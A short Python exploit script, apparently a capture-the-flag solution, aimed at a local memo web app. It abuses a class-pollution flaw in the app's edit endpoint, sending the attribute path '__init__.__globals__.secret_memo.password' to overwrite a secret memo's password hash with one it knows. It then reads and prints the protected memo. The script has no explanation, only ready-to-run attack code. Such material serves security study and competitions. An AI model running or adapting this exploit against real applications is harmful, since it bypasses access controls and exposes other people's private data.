import requests
import hashlib
import sys

if len(sys.argv) == 3:
    url = f'http://{sys.argv[1]}:{sys.argv[2]}'
else:
    url = 'http://127.0.0.1:5000'

viewurl = url+'/view/{0}'
editurl = url+'/edit/{0}'
newurl = url + '/new'

polluted_pw = '1234'
polluted_pw_hash = hashlib.sha256(polluted_pw.encode()).hexdigest()

req = requests.get(url)
req = requests.post(newurl, data={'title':'asdf', 'content':'asdf', 'password':''})
req = requests.post(editurl.format(1), data={'selected_option':'__init__.__globals__.secret_memo.password', 'edit_data':polluted_pw_hash, 'password':''})
req = requests.post(viewurl.format(0), data={'password':polluted_pw})
print(req.text)